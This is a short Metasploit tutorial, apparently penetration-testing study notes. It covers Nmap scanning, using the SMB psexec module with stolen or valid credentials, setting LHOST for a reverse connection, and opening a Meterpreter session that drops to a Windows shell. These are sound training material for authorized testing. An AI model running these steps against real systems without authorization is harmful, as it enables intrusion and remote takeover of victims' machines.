## 1. What is Metasploit

The **Metasploit Framework** is an open-source tool created by Rapid7 for automating vulnerability exploitation and post-exploitation tasks.

It includes:

- Over **2000 exploits**
    
- Over **500 payloads**
    
- Modules for scanning, exploitation, post-exploitation, and evasion
    

**Meterpreter** is the default payload used in many modules, providing extended capabilities for controlling and interacting with the target system.

---

## 2. Starting Metasploit

To launch Metasploit:

```bash
sudo msfconsole
```

You will see the ASCII art banner along with framework statistics such as the number of exploits, payloads, and auxiliary modules available.

Metasploit modules include:

- **Exploits** – Tools for leveraging vulnerabilities
    
- **Payloads** – Code delivered to the target
    
- **Auxiliary modules** – Scanning, enumeration, and support tools
    
- **Encoders** – Used to modify payloads for evasion
    

---

## 3. Target Discovery with Nmap

Use Nmap to scan and fingerprint the target before launching Metasploit:

```bash
nmap -sC -sV -Pn <target-ip>
```

**Example of common ports:**

- **135**: MS RPC
    
- **139**: NetBIOS-SSN
    
- **445**: Microsoft-DS (SMB)
    

This scan also provides OS details and information on SMB security modes.

---

## 4. Searching for SMB Exploits

Within Metasploit:

```bash
search smb
```

From the results, select a relevant module using its index number:

```bash
use 56
```

Example module:

```
exploit/windows/smb/psexec
```

This module leverages valid SMB credentials to deliver a **Meterpreter payload**.

---

## 5. Module Configuration

Use the `options` command to display configurable parameters.

Common settings:

```bash
set RHOSTS <target-ip>
set SHARE ADMIN$
set SMBUser <username>
set SMBPass <password>
set LHOST <your-ip>
```

**Parameter meanings:**

- **RHOSTS**: Target IP address or range
    
- **SHARE**: Shared resource (commonly `ADMIN$`)
    
- **SMBUser**: Username for authentication
    
- **SMBPass**: Password for authentication
    
- **LHOST**: Attacker machine IP for the reverse connection
    

---

## 6. Launching the Exploit

Run:

```bash
exploit
```

The framework will:

1. Connect to the target
    
2. Authenticate with provided credentials
    
3. Select the payload
    
4. Deliver and execute the payload
    

A successful attempt opens a **Meterpreter session**:

```
meterpreter >
```

---

## 7. Working with Meterpreter

Basic Meterpreter commands:

- `?` or `help` – Show available commands
    
- `shell` – Drop into a native system shell:
    
    ```
    meterpreter > shell
    C:\WINDOWS\system32>
    ```
    